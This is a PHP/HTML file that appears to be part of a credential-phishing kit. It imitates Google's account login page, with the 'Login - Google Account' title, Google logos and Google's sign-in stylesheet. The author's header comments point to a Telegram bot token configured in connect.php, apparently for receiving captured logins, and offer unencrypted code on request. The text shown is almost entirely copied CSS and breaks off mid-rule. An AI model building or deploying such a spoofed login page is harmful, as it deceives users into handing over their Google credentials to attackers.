<?php
//===[Script By : anubiskun]===
//===[website : anubis.6te.net]===
//===[github : github.com/anubiskun]===
//===[Telegram : t.me/anubiskun]===

//don't change this file if you don't understand
//to setup token and bot userid, it's in the connect.php file

//to get full code without encrypt contact my telegram : t.me/anubiskun
?>
<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <link rel="icon" href="https://www.freepnglogos.com/uploads/google-logo-png/google-logo-icon-png-transparent-background-osteopathy-16.png">
  <title>Login - Google Account</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: url(//fonts.gstatic.com/s/opensans/v15/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format('truetype');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: url(//fonts.gstatic.com/s/opensans/v15/mem8YaGs126MiZpBA-UFVZ0e.ttf) format('truetype');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_1x.png);
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png);
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_2x.png);
  }
  .header .logo-w {
  background-image: url(https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_112x36dp.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
  }
</style>
<style>
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  top: 380px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style type="text/css">
.captcha-box {
  background: #fff;
  margin: 0 0 10px;
  overflow: hidden;
  padding: 10px;
}
.captcha-box .captcha-img {
  text-align: center;
}
.captcha-box .captcha-label {
  font-weight: bold;
  display: block;
  margin: .5em 0;
}
.captcha-box .captcha-msg {
  color: #999;
  display: block;
  position: relative;
}
.captcha-box .captcha-msg .accessibility-logo {
  float: right;
  border: 0;
}
.captcha-box .audio-box {
  position: absolute;
  top: 0;
}
</style>
<style>
.chromiumsync-custom-content {
  padding-top: 20px;
  margin-bottom: 0;
}
.form-panel {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-transform: translateZ(0);
  -moz-transform: translateZ(0);
  -ms-transform: translateZ(0);
  -o-transform: translateZ(0);
  transform: translateZ(0);
  width: 100%;
}
.form-panel.first {
  z-index: 2;
}
.form-panel.second {
  z-index: 1;
}
.shift-form .form-panel.first {
  z-index: 1;
}
.shift-form .form-panel.second {
  z-index: 2;
}
.slide-in,
.slide-out {
  display: block;
  -webkit-transition-property: -webkit-transform, opacity;
  -moz-transition-property: -moz-transform, opacity;
  -ms-transition-property: -ms-transform, opacity;
  -o-transition-property: -o-transform, opacity;
  transition-property: transform, opacity;
  -webkit-transition-duration: 0.1s;
  -moz-transition-duration: 0.1s;
  -ms-transition-duration: 0.1s;
  -o-transition-duration: 0.1s;
  transition-duration: 0.1s;
  -webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  -o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
}
.slide-out {
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.shift-form .slide-out {
  opacity: 0;
  -webkit-transform: translate3d(-120%, 0, 0);
  -moz-transform: translate3d(-120%, 0, 0);
  -ms-transform: translate3d(-120%, 0, 0);
  -o-transform: translate3d(-120%, 0, 0);
  transform: translate3d(-120%, 0, 0);
}
.slide-in {
  -webkit-transform: translate3d(120%, 0, 0);
  -moz-transform: translate3d(120%, 0, 0);
  -ms-transform: translate3d(120%, 0, 0);
  -o-transform: translate3d(120%, 0, 0);
  transform: translate3d(120%, 0, 0);
}
.shift-form .slide-in {
  opacity: 1;
  -webkit-transform: translate3d(0, 0, 0);
  -moz-transform: translate3d(0, 0, 0);
  -ms-transform: translate3d(0, 0, 0);
  -o-transform: translate3d(0, 0, 0);
  transform: translate3d(0, 0, 0);
}
.error-msg {
  -webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  -o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
  height: auto;
  max-height: 0;
  opacity: 0;
}
.has-error .error-msg {
  max-height: 3.5em;
  margin-top: 10px;
  margin-bottom: 10px;
  opacity: 1;
  visibility: visible;
}
.back-arrow {
  position: absolute;
  top: 37px;
  width: 24px;
  height: 24px;
  display: none;
  cursor: pointer;
}
.back-arrow {
  border-style: none;
}
.shift-form.back-arrow {
  display: block;
}
.back-arrow img {
  display: block;
}
#link-signup {
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signup{
  display: none;
}
#link-signin-different {
  display: none;
  text-align: center;
  font-size: 14px;
}
.shift-form #link-signin-different {
  display: block;
}
.signin-card #profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 0;
  min-height: 1em;
}
.signin-card.no-name #profile-name {
  display: none;
}
.signin-card.no-name #email-display {
  line-height: initial;
  margin-bottom: 16px;
}
.signin-card #email-display {
  display: block;
  padding: 0px 8px;
  color: rgb(64, 64, 64);
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
.signin-card #Email {
  margin-top: 16px;
}
.need-help {
  float: right;
  text-align: right;
}
.form-panel {
  width: 274px;
}
#gaia_firstform {
  z-index: 2;
}
.signin-card {
  position: relative;
  overflow: hidden;
}
.signin-card #profile-name {
  color: #000;
}
.circle-mask {
  display: block;
  height: 96px;
  width: 96px;
  overflow: hidden;
  border-radius: 50%;
  margin-left: auto;
  margin-right: auto;
  z-index: 100;
  margin-bottom: 10px;
}
.circle {
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  -ms-transition-property: -ms-transform;
  -o-transition-property: -o-transform;
  transition-property: transform;
  -webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  -o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
  transition-timing-function: cubic-bezier(.645,.045,.355,1);
}
.circle {
  position: absolute;
  z-index: 101;
  height: 96px;
  width: 96px;
  border-radius: 50%;
  opacity: 0.99;
  overflow: hidden;
  background-repeat: no-repeat;
  background-position: center center;
}
.main {
  overflow: hidden;
}
.card-mask-wrap {
  position: relative;
  width: 360px;
  margin: 0 auto;
  z-index: 1;
}
.dasher-tooltip {
  position: absolute;
  left: 50%;
  margin-left: 150px;
}
.dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
}
.dasher-tooltip p {
  margin-top: 0;
}
.dasher-tooltip p span {
  display: block;
}
.card {
  margin-bottom: 0;
}
.one-google {
  padding-top: 27px;
}
#canvas {
  -webkit-transition: opacity 0.075s;
  -moz-transition: opacity 0.075s;
  -ms-transition: opacity 0.075s;
  -o-transition: opacity 0.075s;
  transition: opacity 0.075s;
  opacity: 0.01;
}
.shift-form #canvas {
  opacity: 0.99;
}
.label {
  color: #404040;
}
#account-chooser-link {
